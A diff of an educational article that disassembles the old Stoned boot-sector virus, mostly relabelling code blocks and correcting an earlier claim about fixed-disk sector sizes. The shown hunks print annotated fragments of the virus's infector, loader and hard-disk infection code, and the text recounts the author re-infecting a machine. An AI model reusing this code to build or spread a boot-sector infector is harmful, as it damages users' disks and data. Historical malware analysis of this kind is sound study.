@@ -86,8 +86,7 @@ continue to use the routine indirectly through the INT 13 vector.
 
 To encourage others to design hardware for their computers, IBM published the specs on the hardware bus used in the PC. Other people began to make hardware cards for 
 the PC, which made PCs more attractive. The Intel 8086 chip was available to the public, and other vendors began to use the chip to build PC clones -- machines identical 
-to the IBM PC save for the ROM code. The true PC ROM was the property of IBM, but compatible ROMs only had to mimic the IBM machines by setting up interrupt vectors that pointed to 
-routines that performed the same basic functions.
+to the IBM PC save for the ROM code. The true PC ROM was the property of IBM, but compatible ROMs only had to mimic the IBM machines by setting up interrupt vectors that pointed to routines that performed the same basic functions.
 
 There is an obvious disadvantage to "hanging" system calls on indirect software interrupt hooks: any program is free to change any of the vectors at any time. For instance, 
 a program could remember the destination of a specific interrupt, say INT 13, and change the vector to point to a new routine. This new routine could perform some meaningful 
@@ -111,7 +110,7 @@ takes the CPU beyond a small media descriptor table that describes the disk's co
 signature jump statement, the ROM executes it by setting the CS register to 0000 and the IP to 7C00. Here is the code from the ROM of my old 286 machine. It performs 
 the transfer from ROM to the operating system.
 
-```
+```plainCode
 ; ROM BIOS BOOTSTRAP
 ; This is where control is transferred to the loaded bootsector
 ...
@@ -181,7 +180,7 @@ The virus will eventually move itself around in memory and copy itself to disk. 
 action is to re-align the CS register so that the virus is at the beginning of segment 07C0. The far jump at location 0000 does nothing more than jump to the very next 
 instruction changing the CS and IP registers along the way. The second instruction is a short (relative) jump over the Infector code and some storage to the Loader at 00A1.
 
-```
+```plainCode
 ; STONED PC COMPUTER VIRUS 
 ; (BOOTSECTOR INFECTOR)
 ;
@@ -217,7 +216,7 @@ reference to the original bootsector when the virus has loaded. Neither of these
 
 ## The Infector 
 
-```
+```plainCode
 ;-----------------------------------------------------------------
 ; Infector
 ;-----------------------------------------------------------------
@@ -259,7 +258,7 @@ gets the motor going, and the motor continues to run while the remaining data is
 last sector is accessed.) By watching the motor, the virus only takes effect on the first sector in a stream of sectors. Otherwise, the user would notice a terrible 
 drop in performance for disk access. Again, this check is quite clever.
 
-```
+```plainCode
 ; Try to infect Drive A
 ;
 003A: 53                PUSH    BX                      ; Save all ...
@@ -284,7 +283,7 @@ just after the virus. Note the PUSHF instruction at 0050. The original INT13 is 
 Since the virus will be CALLing the routine, it must push the flags onto the stack to simulate an INT. Otherwise, too much information is popped off the stack 
 with the RETI, and the CPU crashes.
 
-```
+```plainCode
 0051: 2E FF 1E 09 00    CALL    FAR [CS:$0009]          ; Read boot sector with INT 13
 0056: 73 0E             JNB     $0066                   ; Got it ... move on.
 0058: 33 C0             XOR     AX,AX                   ; Reset drive command
@@ -333,7 +332,7 @@ eliminate the wasted NOPs.
 Searching the code for forward jumps reveals only two: this one and the one at the one at 0105. Closing up these wasted bytes frees two more bytes of memory -- 
 five so far.
 
-```
+```plainCode
 ; At this point the drive is responding - load the boot sector into virus memory segment
 ; and check if it has been infected.
 0066: 33 F6             XOR     SI,SI                   ; Virus starting point
@@ -387,7 +386,7 @@ root directory, the same kind of corruption will occur.
 
 ## The Loader 
 
-```
+```plainCode
 ;-----------------------------------------------------------------
 ; Loader
 ;-----------------------------------------------------------------
@@ -432,9 +431,8 @@ The ROM bootstrap writes the amount of RAM (number of 1K chunks) as a byte to lo
 two 1K-chunks from the memory pool by subtracting 2 from this location. The virus then calculates the segment address of the reserved area and copies its entire 
 length from 0000:7C00 to the permanent location.
 
-Why 2K? The virus is only 1/2K in length -- it just fits in the 512-byte bootsector of a floppy, and it needs only 1/2K to live in. However, the virus must check 
-(by loading) the bootsectors of disks into memory. Since the virus checks the fixed disk (as we will see), the read buffer must be 1K long; the virus is expecting 
-fixed disks to use 1K sectors. Memory is reserved in 1K chunks, and the virus sets aside 2K to fill its 1.5K needs.
+Why 2K? The virus is only 1/2K in length -- it just fits in the 512-byte bootsector. The virus must check (by loading) the bootsectors of disks into memory. 
+Sectors are always 512 bytes. The virus only needs 1K. Yet it reserves 2K. The reason is a mystery -- for now. 
 
 The segment value of the reserved memory is written into the virus data area at 000F -- just behind the offset value of 00E4. The indirect jump at 00DF makes a 
 far jump from 07C0:00DF to RRRR:00E4 where RRRR is the reserved segment. The program picks up at the very next instruction in the listing except now it is running 
@@ -450,7 +448,7 @@ The segment value RRRR is not know until run time, but the MOV at location 00CF 
 Then when the CPU gets to the instruction a few cycles later, it will know exactly where to go! This is called "self-modifying" code since the program actually writes 
 its own instructions as it executes. Changing the JMP eliminates the four bytes of data at 000D. That brings our savings up to 9 bytes.
 
-```
+```plainCode
 ; At this point virus is running in its new 2K home at the end of RAM.
 00E4: B8 00 00          MOV     AX,$0000                ; Reset disk system (prepare for IO)
 00E7: CD 13             INT     $13                     ; Disk now ready
@@ -478,7 +476,7 @@ Notice the instruction at 00E4. AX is used to pass information into the INT13; A
 MOVs to load parameters into registers for INT calls is second nature to 8x86 programmers, and we generally find immediate MOVs before any INTx instruction. 
 However, at 00E4 the programmer could have saved a byte by doing an "XOR AX,AX" (which results in 0000). That brings our code savings up to 10 bytes.
 
-```
+```plainCode
 ; We are booting up from a floppy - have a look at any local fixed-disks.
 0106: B9 03 00          MOV     CX,$0003                ; Cyl 0, Sec 3 
 0109: BA 00 01          MOV     DX,$0100                ; Head 1, Drive 0
@@ -502,7 +500,7 @@ times a second, and the clock-handler routine increments the word at 0000:046C. 
 essentially a random number. The test at 0116 will fall through to the next section of code if the lower three bits of the timer are all 0's. If you boot your 
 PC from an infected floppy, you will see the famous "Your PC is now stoned!" message on average of once every eight boot-ups.
 
-```
+```plainCode
 ; 1 out of every 8 infected hard drives will see this message at the boot up where
 ; they are infected.
 0118: BE 89 01          MOV     SI,$0189                ; Message
@@ -543,7 +541,7 @@ in the computer. Ah, those were the days!
 If the first four bytes of the loaded bootsector match the virus, the disk is already infected and the original bootsector is executed with the following section of 
 code. Otherwise, the hard-disk infection continues at 0159.
 
-```
+```plainCode
 ; No matter how virus loaded, it infects only floppy disks that get a copy of the
 ; memory-resident copy of the virus. We want floppies to have media type = 0.
 014E: 2E C6 06 08 00 00 MOV     BYTE PTR [CS:$0008],$00 ; Media type = floppy.
@@ -558,7 +556,7 @@ The very last thing the virus does before turning control over to the original b
 booted. Once it is loaded into memory, the virus only infects floppies. To infect a floppy, the virus copies the entire memory-resident virus to the bootsector 
 of the disk -- the media-type flag is set to zero for once and for all.
 
-```
+```plainCode
 ; Infect hard-drive
 0159: 2E C6 06 08 00 02 MOV     BYTE PTR [CS:$0008],$02 ; Store virus on C: with flag set
 015F: B8 01 03          MOV     AX,$0301                ; Write 1 sector
@@ -568,12 +566,10 @@ of the disk -- the media-type flag is set to zero for once and for all.
 016B: CD 13             INT     $13                     ; Store original boot in FAT
 016D: 72 DF             JB      $014E                   ; Error ... out of here
 ;
-; Floppies are assumed to have 512 byte sectors (0200 hex) which is just barely
-; room for the virus. Fixed disks are assumed to have twice that - 1K sectors (0400).
-; The last 512 bytes of a fixed-disk boot record contain four partition descriptors.
-; These descriptors describe the partitions and must be present in the infected
-; sector - this code copies the descriptors into the virus sector buffer before writing
-; it to disk.
+; Sectors are always 512 bytes (0200 hex). A fixed-disk's bootsectors contains four
+; partition descriptors. These descriptors describe the partitions of the fixed-disk
+; and must be present in the infected sector - this code copies the descriptors into 
+; the virus sector buffer before writing it to disk.
 016F: 0E                PUSH    CS                      ; Set DS ...
 0170: 1F                POP     DS                      ; ... to CS
 0171: 0E                PUSH    CS                      ; Set ES ...
@@ -611,11 +607,11 @@ of the disk -- the media-type flag is set to zero for once and for all.
 01B3: 55 41 4E 41 21
 ```
       
-As the above code shows, infecting a fixed-disk's bootsector is slightly more complicated. In general, fixed-disks have 1K sectors (twice as large as 
-the sectors on a floppy). The first half of the sector contains a normal bootsector program, but the last half contains a special data-area that describes 
-all of the partitions on the drive. The flags in this area indicate which partition is active and what kind of file-system each partition contains. The virus 
-must be careful to preserve this partition-table before replacing the existing bootsector. The string operation at 017C copies the partition table from the 
-end of the original bootsector onto the end of the virus.
+As the above code shows, infecting a fixed-disk's bootsector is slightly more complicated. The first half of the sector contains a normal 
+bootsector program, but the last half contains a special data-area that describes all of the partitions on the drive. The flags in this area 
+indicate which partition is active and what kind of file-system each partition contains. The virus must be careful to preserve this 
+partition-table before replacing the existing bootsector. The string operation at 017C copies the partition table from the end of the original 
+bootsector onto the end of the virus.
 
 Interestingly, one mutation of this virus known as the Monkey Virus dropped this check in order to make room for other functionality. Most operating systems 
 depend on the information in the partition-table, and a Monkey infested fixed-disk is often unusable.
@@ -687,3 +683,7 @@ Congratulations! You now have a floppy infected with the Stoned virus. I booted 
 such experiments. (It is almost an archeological find in itself). After several boots, I got the signature Stoned message, and I used DEBUG to look at the 
 bootsector of the C: drive. Sure enough, the virus was there. I formatted a new floppy in the A: drive and used DEBUG to look at its bootsector -- there was 
 the virus as expected, alive again after all these years.
+
+# Corrections
+
+I had originally said fixed-disks had 1K sectors. tkchia corrected me on that. Thanks!
